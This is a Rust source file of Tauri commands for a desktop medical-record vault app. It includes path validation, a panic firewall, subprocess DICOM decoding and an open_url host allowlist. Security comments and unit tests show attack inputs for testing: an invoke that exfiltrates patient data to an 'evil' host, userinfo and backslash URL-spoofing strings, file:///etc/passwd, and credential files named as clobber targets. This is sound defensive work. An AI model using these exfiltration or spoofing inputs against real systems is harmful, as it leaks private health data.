use crate::dto::*;
use core_model::{DocType, Document, Vault};
use std::sync::Mutex;
use tauri::{Manager, State};
use tauri_plugin_opener::OpenerExt;

/// DocumentSummary + 影像检查切片数(imaging overhaul P1):影像 study 文档在时间线
/// 上显示"N 张切片";非影像文档 slice_count 为 None。
fn doc_summary(v: &Vault, d: &Document) -> DocumentSummary {
    let mut s = DocumentSummary::from(d);
    if d.doc_type == DocType::ImagingReport {
        if let Ok(n) = v.imaging_instance_count(d.id) {
            if n > 0 {
                s.slice_count = Some(n as i32);
            }
        }
    }
    s
}

pub struct AppState {
    pub vault: Mutex<Vault>,
    /// 收件箱 notify 监听器,需要在 AppState 里存活,否则一超出作用域就会被 drop 从而
    /// 停止监听。setup() 里启动后写入;生命周期与 App 一致。
    pub inbox_watcher: Mutex<Option<notify::RecommendedWatcher>>,
}

// SECURITY/robustness: recover a poisoned lock instead of failing every command.
// The risky command entry points isolate their library calls so a bad file can't
// poison this mutex in the first place: ingest runs under `catch_unwind` (see
// `ingest_guarded`), and DICOM pixel decoding runs in a separate child process
// (see `render_dicom` / `decode_dicom_frame` → `dicom_subprocess`), which also
// contains C/C++ codec memory corruption that `catch_unwind` could not. But if
// some *other* path ever panics while holding the guard, `into_inner()` keeps the
// Vault usable rather than bricking the whole app past one bad operation — the
// Vault's own truth is the append-only log + CAS, not transient in-memory state,
// so a recovered guard is safe.
fn lock<'a>(s: &'a State<'a, AppState>) -> Result<std::sync::MutexGuard<'a, Vault>, String> {
    Ok(s.vault
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner()))
}

/// Panic firewall around `pipeline::ingest`. A panic inside the parser/dicom/ocr
/// stack (defense-in-depth: those libs already have internal guards) is caught here
/// and turned into a normal `Err(String)`, so it can't unwind the command thread past
/// the held Vault guard and poison the shared mutex. `AssertUnwindSafe` is required
/// because `&Vault` (rusqlite connection) isn't `UnwindSafe`; that's fine — on a
/// caught panic we do not touch any half-mutated state, we just report the failure and
/// the caller moves on to the next file.
pub(crate) fn ingest_guarded(
    v: &Vault,
    path: &std::path::Path,
) -> Result<pipeline::IngestOutcome, String> {
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| pipeline::ingest(v, path))) {
        Ok(Ok(o)) => Ok(o),
        Ok(Err(e)) => Err(e.to_string()),
        Err(_) => Err("导入时发生内部错误(已隔离),该文件已跳过".to_string()),
    }
}

/// SECURITY: validate a JS-supplied save destination before we write app-generated
/// content to it. The frontend always sources these paths from the native save
/// dialog (AuditView / ImportView `save({...})`), but a malicious `invoke` could
/// pass ANY path. Requiring an absolute path with an expected extension and no `..`
/// components removes the arbitrary-file clobber primitive (can't overwrite
/// `~/.zshrc`, `~/.ssh/id_rsa`, binaries, launch agents, …) while still allowing the
/// dialog-driven `.csv` / `.html` save flows the app actually uses.
fn validate_dest_path(path: &str, allowed_ext: &[&str]) -> Result<std::path::PathBuf, String> {
    let p = std::path::PathBuf::from(path);
    if !p.is_absolute() {
        return Err("拒绝:目标路径必须是绝对路径".to_string());
    }
    if p.components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("拒绝:目标路径不得包含 `..`".to_string());
    }
    let ext_ok = p
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| allowed_ext.iter().any(|a| a.eq_ignore_ascii_case(e)))
        .unwrap_or(false);
    if !ext_ok {
        return Err(format!("拒绝:目标文件扩展名必须是 {allowed_ext:?} 之一"));
    }
    Ok(p)
}

#[tauri::command]
pub fn list_timeline_grouped(state: State<AppState>) -> Result<Vec<TimelineGroup>, String> {
    let v = lock(&state)?;
    v.rebuild_encounters().map_err(|e| e.to_string())?; // 幂等,确保 CLI 导入的数据也分组
    let mut groups: Vec<(Option<String>, TimelineGroup)> = Vec::new(); // (sort_date, group)
    for (enc, docs) in v.encounters_with_docs().map_err(|e| e.to_string())? {
        let sort = enc.start_date.map(|d| d.to_rfc3339());
        let summary = EncounterSummary::from_encounter(&enc, docs.len() as i64);
        let doc_dtos = docs.iter().map(|d| doc_summary(&v, d)).collect();
        groups.push((
            sort,
            TimelineGroup::Encounter {
                encounter: summary,
                docs: doc_dtos,
            },
        ));
    }
    for d in v.standalone_documents().map_err(|e| e.to_string())? {
        let sort = d.doc_date.map(|x| x.to_rfc3339());
        groups.push((
            sort,
            TimelineGroup::Document {
                doc: doc_summary(&v, &d),
            },
        ));
    }
    // 按日期倒序,无日期最后
    groups.sort_by(|a, b| match (&a.0, &b.0) {
        (Some(x), Some(y)) => y.cmp(x),
        (Some(_), None) => std::cmp::Ordering::Less,
        (None, Some(_)) => std::cmp::Ordering::Greater,
        (None, None) => std::cmp::Ordering::Equal,
    });
    Ok(groups.into_iter().map(|(_, g)| g).collect())
}

#[tauri::command]
pub fn search(
    state: State<AppState>,
    query: String,
    limit: usize,
) -> Result<Vec<SearchResult>, String> {
    let v = lock(&state)?;
    let hits = v.search(&query, limit).map_err(|e| e.to_string())?;
    let mut out = Vec::new();
    for h in hits {
        // 取真实 document.title(而非 SearchHit 里的分词 title)
        if let Some(doc) = v.document_by_id(h.document_id).map_err(|e| e.to_string())? {
            out.push(SearchResult {
                document: DocumentSummary::from(&doc),
                snippet: h.snippet,
            });
        }
    }
    Ok(out)
}

#[tauri::command]
pub fn get_document(state: State<AppState>, id: i64) -> Result<DocumentDetail, String> {
    let v = lock(&state)?;
    let doc = v
        .document_by_id(id)
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("document {id} not found"))?;
    let sf = v
        .source_file_by_id(doc.source_file_id)
        .map_err(|e| e.to_string())?
        .ok_or_else(|| "source_file missing".to_string())?;
    let text = v.ocr_text(id).map_err(|e| e.to_string())?;
    let ocr_confidence = v.ocr_confidence(id).map_err(|e| e.to_string())?;
    let ocr_backend = v.ocr_backend(id).map_err(|e| e.to_string())?;
    Ok(DocumentDetail {
        document: doc_summary(&v, &doc),
        source_file: SourceFileMeta::from(&sf),
        ocr_text: text,
        ocr_confidence,
        ocr_backend,
    })
}

#[tauri::command]
pub fn import_paths(
    state: State<AppState>,
    paths: Vec<String>,
) -> Result<Vec<ImportOutcome>, String> {
    let v = lock(&state)?;
    let mut out = Vec::new();
    for p in paths {
        let path = std::path::Path::new(&p);
        // SECURITY: these paths come from the native file picker / OS drag-drop, so we
        // deliberately do NOT confine them to a directory (import-from-anywhere is the
        // point). Minimal guard: reject anything that isn't an existing regular file
        // before touching it, so a malicious `invoke` can't aim ingest at directories,
        // device nodes, or dangling paths. Residual trust: whatever real file the user
        // (or a crafted invoke) points at gets read into the vault.
        if !path.is_file() {
            out.push(ImportOutcome {
                name: p.clone(),
                source_file_id: 0,
                status: "failed".to_string(),
                doc_type: None,
            });
            continue;
        }
        // 单个文件失败不该拖垮整批 —— 记一条失败结果继续处理剩下的文件(与
        // inbox.rs::scan_inbox 的容错方式一致),而不是 `?` 提前返回丢弃已成功的导入。
        match ingest_guarded(&v, path) {
            Ok(o) => {
                let status = match o.status {
                    pipeline::IngestStatus::New => "new",
                    pipeline::IngestStatus::Backfilled => "backfilled",
                    pipeline::IngestStatus::Deduped => "deduped",
                    pipeline::IngestStatus::StoredNoText => "stored_no_text",
                    pipeline::IngestStatus::InstanceAttached => "instance_attached",
                }
                .to_string();
                out.push(ImportOutcome {
                    name: o.name,
                    source_file_id: o.source_file_id,
                    status,
                    doc_type: o.doc_type.map(|d| d.as_str().to_string()),
                });
            }
            Err(e) => {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| p.clone());
                eprintln!("[import] ingest failed for {}: {e}", path.display());
                out.push(ImportOutcome {
                    name,
                    source_file_id: 0,
                    status: "failed".to_string(),
                    doc_type: None,
                });
            }
        }
    }
    v.rebuild_encounters().map_err(|e| e.to_string())?;
    Ok(out)
}

/// 示例数据(张建国)目录:随 `bundle.resources`(见 tauri.conf.json)打包进 `demo-data/`。
/// `tauri-build` 在 `build.rs` 编译期就把它复制进 `target/(debug|release)`,而
/// `resource_dir()` 在「从 target/ 目录运行」时会识别为开发环境并直接返回该目录 ——
/// 所以 `tauri dev` 和打包后的 .app 都能解析到同一份资源,无需区分。极端情况下(资源目录
/// 未就绪)回退到编译期已知的源码目录,仅在本机构建时生效。
fn demo_data_dir(app: &tauri::AppHandle) -> Option<std::path::PathBuf> {
    if let Ok(dir) = app.path().resource_dir() {
        let candidate = dir.join("demo-data");
        if candidate.is_dir() {
            return Some(candidate);
        }
    }
    let dev_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("demo-data");
    if dev_dir.is_dir() {
        return Some(dev_dir);
    }
    None
}

/// 递归收集目录下全部常规文件(demo-data/ 下有 corpus/scenarios/imaging 子目录)。
fn collect_files_recursive(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            collect_files_recursive(&path, out);
        } else if path.is_file() {
            out.push(path);
        }
    }
}

/// 一键「加载示例数据」:把打包好的张建国示例病历批量导入保险箱,让刚装好 .dmg 的
/// 测试者无需自己找文件就能试用。按路径排序保证每次结果可复现;单个文件导入失败
/// 不拖垮整批(与 import_paths/scan_inbox 一致),已存在的记录会被 pipeline::ingest
/// 去重,重复点击是安全的。返回成功导入的文件数。
#[tauri::command]
pub fn load_demo_data(app: tauri::AppHandle, state: State<AppState>) -> Result<usize, String> {
    let dir = demo_data_dir(&app).ok_or_else(|| "示例数据未随应用打包,无法加载".to_string())?;
    let mut files = Vec::new();
    collect_files_recursive(&dir, &mut files);
    files.sort();

    let v = lock(&state)?;
    let mut count = 0usize;
    for path in &files {
        match ingest_guarded(&v, path) {
            Ok(_) => count += 1,
            Err(e) => eprintln!("[demo-data] ingest failed for {}: {e}", path.display()),
        }
    }
    v.rebuild_encounters().map_err(|e| e.to_string())?;
    Ok(count)
}

// 大文件(照片/DICOM)走 tauri::ipc::Response 返回原始字节,而非 Vec<u8>(会被序列化成
// JSON number[] —— 10MB 照片膨胀成 ~30MB 文本,每次打开文档都要构建+解析,卡顿甚至 OOM)。
#[tauri::command]
pub fn read_source_bytes(state: State<AppState>, id: i64) -> Result<tauri::ipc::Response, String> {
    let v = lock(&state)?;
    let sf = v
        .source_file_by_id(id)
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("source_file {id} not found"))?;
    let path = v.root_join(&sf.storage_path); // 见 core-model cas.rs 的 root_join
    let bytes = std::fs::read(&path).map_err(|e| e.to_string())?;
    Ok(tauri::ipc::Response::new(bytes))
}

/// 一台影像检查文档的全部切片(按堆栈顺序)。前端据此把多张 DICOM 作为一叠
/// 载入查看器滚动阅片;返回空则该文档退回单源渲染(见 DocumentView)。
#[tauri::command]
pub fn get_imaging_instances(
    state: State<AppState>,
    document_id: i64,
) -> Result<Vec<ImagingInstanceDto>, String> {
    let v = lock(&state)?;
    let insts = v
        .imaging_instances(document_id)
        .map_err(|e| e.to_string())?;
    Ok(insts.iter().map(ImagingInstanceDto::from).collect())
}

#[tauri::command]
pub fn render_dicom(state: State<AppState>, id: i64) -> Result<tauri::ipc::Response, String> {
    let v = lock(&state)?;
    let sf = v
        .source_file_by_id(id)
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("source_file {id} not found"))?;
    let bytes = std::fs::read(v.root_join(&sf.storage_path)).map_err(|e| e.to_string())?;
    // SECURITY (advisory GHSA-24px): decode the pixels in a short-lived, isolated
    // child process rather than in-process. The vendored C/C++ JPEG2000/JPEG-LS
    // codecs are a memory-corruption RCE surface that `catch_unwind` cannot
    // contain; the subprocess boundary confines any crash/exploit to the child,
    // which can't touch the vault or this process. A non-zero exit / timeout /
    // oversized output comes back as an `Err` and degrades like an unsupported
    // transfer syntax (the frontend already handles that). See `dicom_subprocess`.
    let png = crate::dicom_subprocess::render_png(&bytes)?;
    Ok(tauri::ipc::Response::new(png))
}

/// Decodes one frame of a DICOM instance to raw pixels for the interactive
/// viewer, handling compressed transfer syntaxes the JS viewer can't
/// (JPEG 2000 / JPEG-LS / RLE). Returns a single buffer: 4-byte little-endian
/// header length + JSON [`dicom::DecodedFrameHeader`] + raw pixel bytes (see
/// `DicomViewer.tsx`, which slices it back apart and applies window/level).
#[tauri::command]
pub fn decode_dicom_frame(
    state: State<AppState>,
    source_file_id: i64,
    frame_index: u32,
) -> Result<tauri::ipc::Response, String> {
    let v = lock(&state)?;
    let sf = v
        .source_file_by_id(source_file_id)
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("source_file {source_file_id} not found"))?;
    let bytes = std::fs::read(v.root_join(&sf.storage_path)).map_err(|e| e.to_string())?;
    // SECURITY (advisory GHSA-24px): same isolation as `render_dicom` — the
    // compressed-transfer-syntax decode path (JPEG2000/JPEG-LS via C/C++) runs in
    // the isolated child process, which returns the IPC bytes (header + raw
    // pixels) on success or degrades on crash/timeout. See `dicom_subprocess`.
    let wire = crate::dicom_subprocess::decode_frame_ipc(&bytes, frame_index)?;
    Ok(tauri::ipc::Response::new(wire))
}

#[tauri::command]
pub fn export_vault(_state: State<AppState>, _dest_path: String) -> Result<ExportSummary, String> {
    // C2/后续:真正打包 objects/ + JSON 清单。此处占位返回 0,避免未实现命令。
    Ok(ExportSummary {
        file_count: 0,
        byte_size: 0,
    })
}

/// 导出 v1:把整条时间线渲染成自包含 HTML 写到 `dest_path`(见
/// `medme_share::export::build_timeline_html`)。可在任意浏览器打开、原生渲染中文,
/// 并通过浏览器「打印 / 另存为 PDF」交给医生。
#[tauri::command]
pub fn export_timeline_html(
    state: State<AppState>,
    dest_path: String,
) -> Result<ExportSummary, String> {
    // SECURITY: constrain the JS-supplied save target to an absolute `.html` path
    // (see validate_dest_path) so a malicious invoke can't clobber arbitrary files.
    let dest = validate_dest_path(&dest_path, &["html", "htm"])?;
    let v = lock(&state)?;
    let (html, record_count) = medme_share::export::build_timeline_html(&v)?;
    let byte_size = html.len() as i64;
    let sha256 = core_model::cas::sha256_hex(html.as_bytes());
    std::fs::write(&dest, html).map_err(|e| e.to_string())?;
    // 审计追踪:导出落盘成功后记入不可变事件日志(见 core-model::audit)。
    v.record_export("timeline_html", &sha256, record_count)
        .map_err(|e| e.to_string())?;
    Ok(ExportSummary {
        file_count: record_count,
        byte_size,
    })
}

/// 端到端加密分享:把全部病历打包成一份自包含加密 HTML 写到 `dest_path`
/// (见 `medme_share::share::build_encrypted_share`),返回口令(需另行单独告知医生)、
/// 记录数与文件字节数。默认有效期 5 天。
#[tauri::command]
pub fn create_share(
    state: State<AppState>,
    dest_path: String,
    expires_days: Option<u32>,
) -> Result<ShareResult, String> {
    // SECURITY: constrain the JS-supplied save target to an absolute `.html` path
    // (see validate_dest_path) so a malicious invoke can't clobber arbitrary files.
    let dest = validate_dest_path(&dest_path, &["html", "htm"])?;
    let v = lock(&state)?;
    let days = expires_days.unwrap_or(5);
    let (html, passphrase, record_count) = medme_share::share::build_encrypted_share(&v, days)?;
    let byte_size = html.len() as i64;
    let sha256 = core_model::cas::sha256_hex(html.as_bytes());
    std::fs::write(&dest, html).map_err(|e| e.to_string())?;
    let expires = (chrono::Utc::now() + chrono::Duration::days(days as i64)).to_rfc3339();
    // 审计追踪:分享文件落盘成功后记入不可变事件日志(见 core-model::audit)。
    v.record_share(&sha256, record_count, &expires)
        .map_err(|e| e.to_string())?;
    Ok(ShareResult {
        passphrase,
        record_count,
        byte_size,
    })
}

#[tauri::command]
pub fn get_patient_profile(state: State<AppState>) -> Result<PatientProfile, String> {
    let v = lock(&state)?;
    let p = pipeline::patient_profile(&v).map_err(|e| e.to_string())?;
    Ok(PatientProfile {
        name: p.name,
        gender: p.gender,
        birth_date: p.birth_date,
        age: p.age,
        record_count: p.record_count,
    })
}

/// 收件箱(Watch Folder)当前路径。
#[tauri::command]
pub fn get_inbox_path(app: tauri::AppHandle) -> String {
    crate::inbox::read_inbox_path(&app)
        .to_string_lossy()
        .to_string()
}

/// 修改收件箱路径:持久化到 config.json、创建目录、立即重扫一次。
/// 注意:不会重新定位正在运行的 notify watcher(仍监听旧目录),需重启应用才会
/// 切到新目录监听;新路径下一次启动扫描/手动导入始终立即生效。
#[tauri::command]
pub fn set_inbox_path(
    app: tauri::AppHandle,
    state: State<AppState>,
    path: String,
) -> Result<(), String> {
    let new_path = std::path::PathBuf::from(&path);
    // SECURITY: the watch folder is user-chosen and can legitimately live anywhere, so
    // we don't confine it to the vault. Minimal guard: require an absolute path and
    // reject one that already exists as a non-directory, so a malicious invoke can't
    // aim create_dir_all at a surprising relative/into-a-file location. Residual: this
    // trusts the picker-driven directory choice (it only creates dirs; it does not read
    // or clobber file contents).
    if !new_path.is_absolute() {
        return Err("拒绝:收件箱路径必须是绝对路径".to_string());
    }
    if new_path.exists() && !new_path.is_dir() {
        return Err("拒绝:收件箱路径已存在且不是目录".to_string());
    }
    std::fs::create_dir_all(&new_path).map_err(|e| e.to_string())?;
    crate::inbox::write_inbox_path(&app, &new_path).map_err(|e| e.to_string())?;
    crate::inbox::scan_inbox(&app, &state);
    Ok(())
}

/// 在系统文件管理器中打开收件箱目录(不存在则先创建)。
#[tauri::command]
pub fn open_inbox(app: tauri::AppHandle) -> Result<(), String> {
    let inbox = crate::inbox::read_inbox_path(&app);
    std::fs::create_dir_all(&inbox).map_err(|e| e.to_string())?;
    app.opener()
        .open_path(inbox.to_string_lossy().to_string(), None::<String>)
        .map_err(|e| e.to_string())
}

/// 用系统默认程序打开任意文件/目录 —— 用于导出完成后一键在浏览器打开导出的 HTML。
#[tauri::command]
pub fn open_path(app: tauri::AppHandle, path: String) -> Result<(), String> {
    // SECURITY: this hands a path to the OS default handler (which can launch apps), so
    // require it to actually exist before opening it — that removes the "blind-open an
    // arbitrary string" primitive. Residual trust: the frontend only calls this with
    // the vault root or a file MedMe just exported to a user-chosen save location, so we
    // deliberately do NOT confine it to the vault (that would break "open the HTML I
    // just saved anywhere").
    if !std::path::Path::new(&path).exists() {
        return Err("拒绝:目标路径不存在".to_string());
    }
    app.opener()
        .open_path(path, None::<String>)
        .map_err(|e| e.to_string())
}

/// 「关于」页里仅有的两个合法外链目标:项目主页(github.io)与源码仓库(github.com)。
/// 与前端 AboutView.tsx 的 HOMEPAGE_URL / REPO_URL 主机一一对应。
const OPEN_URL_ALLOWED_HOSTS: [&str; 2] = ["lexuan-lin.github.io", "github.com"];

/// 从一个 http(s) URL(应已转小写)里取出主机名(去掉 userinfo 与端口)。
/// 在**最后一个** `@` 处切,使 `https://github.com@evil/` 解析出的是 `evil` 而非
/// `github.com`;`\` 与 `/`、`?`、`#` 同样视作 authority 的结束,防止绕过。
fn open_url_host(lower_url: &str) -> Option<String> {
    let rest = lower_url
        .strip_prefix("http://")
        .or_else(|| lower_url.strip_prefix("https://"))?;
    let authority_end = rest.find(['/', '\\', '?', '#']).unwrap_or(rest.len());
    let authority = &rest[..authority_end];
    let hostport = match authority.rfind('@') {
        Some(i) => &authority[i + 1..],
        None => authority,
    };
    let host = hostport.split(':').next().unwrap_or(hostport);
    if host.is_empty() {
        None
    } else {
        Some(host.to_string())
    }
}

/// 在系统默认浏览器打开一个外部 URL(用于「关于」页的项目主页/源码链接)。
#[tauri::command]
pub fn open_url(app: tauri::AppHandle, url: String) -> Result<(), String> {
    // SECURITY: only allow http(s) external URLs (the About page's homepage/repo
    // links). Reject `file://` and custom-scheme URLs so a malicious invoke can't use
    // this to open local files or trigger arbitrary URL-scheme handlers.
    let u = url.trim();
    let scheme = u.to_ascii_lowercase();
    if !(scheme.starts_with("http://") || scheme.starts_with("https://")) {
        return Err("拒绝:只允许打开 http(s) 链接".to_string());
    }
    // SECURITY: scheme alone is not enough — without a host allowlist a compromised
    // webview could `invoke('open_url', {url: 'https://evil/?d=<PHI>'})` and exfiltrate
    // via the system browser (CSP-bypass). Restrict to the About page's two real
    // destinations; reject everything else.
    let host = open_url_host(&scheme).ok_or_else(|| "拒绝:无法解析链接域名".to_string())?;
    if !OPEN_URL_ALLOWED_HOSTS.contains(&host.as_str()) {
        return Err("拒绝:只允许打开 MedMe 项目主页或源码仓库链接".to_string());
    }
    app.opener()
        .open_url(u, None::<String>)
        .map_err(|e| e.to_string())
}

/// 数据保险箱(vault)根目录路径 —— 设置页展示,供用户把它放进 iCloud/坚果云
/// 等云同步目录,实现无需服务器的多设备同步。见 set_vault_path 可运行时更换位置。
#[tauri::command]
pub fn get_vault_path(state: State<AppState>) -> Result<String, String> {
    let v = lock(&state)?;
    Ok(v.root().to_string_lossy().to_string())
}

/// 更换数据保险箱位置 —— 把现有病历搬到 `new_dir`(用户从原生「选择文件夹」对话框选的),
/// 从而可把保险箱指向 iCloud 云盘 / 坚果云等同步目录实现多设备同步。
///
/// - 目标目录**没有**保险箱 → 把 objects/、log/、medme.db、VERSION 整体搬过去。
/// - 目标目录**已有**保险箱(另一台设备已在共享文件夹里建过) → 采纳并合并:把本机的
///   日志分段 + CAS 对象拷贝进去(按设备命名的分段不冲突、内容寻址对象按路径去重),
///   目标的派生库随后由日志重放重建 —— 复用 core-model 的 relocate_to + rebuild_from_log,
///   不自己造事件去重。
///
/// 搬迁 → 持久化新位置 → 换掉 AppState 里的 Vault 并重建派生库,返回新路径。
#[tauri::command]
pub fn set_vault_path(
    app: tauri::AppHandle,
    state: State<AppState>,
    new_dir: String,
) -> Result<String, String> {
    // SECURITY: new_dir 来自原生「选择文件夹」对话框,但仍做基本校验 —— 要求绝对路径、
    // 不含 `..`,已存在则必须是目录,避免恶意 invoke 把数据搬到意外/相对位置。
    let target = std::path::PathBuf::from(&new_dir);
    if !target.is_absolute() {
        return Err("拒绝:新位置必须是绝对路径".to_string());
    }
    if target
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("拒绝:新位置不得包含 `..`".to_string());
    }
    if target.exists() && !target.is_dir() {
        return Err("拒绝:新位置已存在且不是目录".to_string());
    }

    let mut guard = lock(&state)?;
    // 1) 把现有保险箱搬迁/采纳到目标(源在目标写完前绝不部分删除,见 relocate_to)。
    guard.relocate_to(&target).map_err(|e| e.to_string())?;
    // 2) 持久化新位置,下次启动直接打开这里。
    crate::vault_loc::write_vault_location(&app, &target).map_err(|e| e.to_string())?;
    // 3) 换掉内存里的 Vault 到新根,并从合并后的日志重建派生库(采纳路径靠它把另一台
    //    设备的事件投影进来)。旧 Vault 在赋值时被 drop,连接随之关闭。
    *guard = Vault::open(&target).map_err(|e| e.to_string())?;
    guard.rebuild_from_log().map_err(|e| e.to_string())?;
    Ok(guard.root().to_string_lossy().to_string())
}

/// 隐藏的「审计/管理员」视图数据源:所有导入/导出/分享事件,最新在前,含
/// 内容 sha256(见 core-model::audit —— 不可变事件日志,可核验、防篡改)。
#[tauri::command]
pub fn get_audit_log(state: State<AppState>) -> Result<Vec<AuditEntryDto>, String> {
    let v = lock(&state)?;
    let entries = v.audit_log().map_err(|e| e.to_string())?;
    Ok(entries.iter().map(AuditEntryDto::from).collect())
}

/// 把文本写到用户选择的路径 —— 目前仅用于审计视图「导出审计清单」(CSV)。
#[tauri::command]
pub fn write_text_file(path: String, contents: String) -> Result<(), String> {
    // SECURITY: this is the only raw text-write IPC command and is used solely by the
    // audit view's "export audit CSV" (via the native save dialog). Constrain the
    // JS-supplied target to an absolute `.csv` path (see validate_dest_path) so a
    // malicious invoke can't turn this into an arbitrary-file write primitive.
    let dest = validate_dest_path(&path, &["csv"])?;
    std::fs::write(&dest, contents).map_err(|e| e.to_string())
}

#[cfg(test)]
mod demo_data_tests {
    use super::collect_files_recursive;
    use std::path::PathBuf;

    /// 验证 demo_data_dir() 的开发环境回退路径(`CARGO_MANIFEST_DIR/demo-data`)
    /// 确实存在、且 collect_files_recursive 能递归穿过 corpus/scenarios/imaging
    /// 三个子目录收集到全部 25 个文件。不需要构造 AppHandle 就能核验路径逻辑与
    /// 打包清单(tauri.conf.json `bundle.resources: ["demo-data"]`)是否对得上 ——
    /// 数量对不上时,多半是有人往 demo-data/ 加了文件却忘了更新这条断言,或者
    /// 反过来忘了往 examples/demo-dataset/ 同步。
    #[test]
    fn dev_fallback_dir_has_expected_curated_files() {
        let dev_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("demo-data");
        assert!(dev_dir.is_dir(), "demo-data/ missing at {dev_dir:?}");

        for sub in ["corpus", "scenarios", "imaging"] {
            assert!(dev_dir.join(sub).is_dir(), "demo-data/{sub} missing");
        }

        let mut files = Vec::new();
        collect_files_recursive(&dev_dir, &mut files);
        assert_eq!(
            files.len(),
            25,
            "unexpected demo-data file count: {files:?}"
        );

        // 3 张真实 DICOM(头颅MRI/胸部X线/腹部超声)一定都在
        for name in [
            "2023-11-02_头颅MRI_华山.dcm",
            "2025-02-18_胸部X线_协和.dcm",
            "2024-03-22_腹部超声动态_华山.dcm",
        ] {
            assert!(
                files
                    .iter()
                    .any(|p| p.file_name().and_then(|n| n.to_str()) == Some(name)),
                "missing imaging file: {name}"
            );
        }
    }
}

#[cfg(test)]
mod open_url_tests {
    use super::{open_url_host, OPEN_URL_ALLOWED_HOSTS};

    /// Mirror `open_url`'s gate: lowercase, extract host, check the allowlist.
    fn allowed(url: &str) -> bool {
        let lower = url.to_ascii_lowercase();
        match open_url_host(&lower) {
            Some(h) => OPEN_URL_ALLOWED_HOSTS.contains(&h.as_str()),
            None => false,
        }
    }

    #[test]
    fn allows_only_the_about_page_hosts() {
        assert!(allowed(
            "https://lexuan-lin.github.io/shadow_medical_record-/"
        ));
        assert!(allowed("https://github.com/Chesterguan/medme"));
        assert!(allowed("HTTPS://GitHub.com/Chesterguan/medme")); // case-insensitive
        assert!(allowed("https://github.com:443/x")); // port must not confuse host parse
    }

    #[test]
    fn rejects_other_and_spoofed_hosts() {
        assert!(!allowed("https://evil.com/?d=phi")); // exfil target
        assert!(!allowed("https://evil.github.io/")); // different host, same suffix
                                                      // userinfo spoof: authority `github.com@evil.com` → real host is evil.com.
        assert!(!allowed("https://github.com@evil.com/"));
        // backslash acts as a path separator, so it can't smuggle a trailing host.
        assert!(!allowed("https://evil.com\\@github.com/"));
        assert!(!allowed("file:///etc/passwd")); // non-http scheme has no allowed host
    }
}
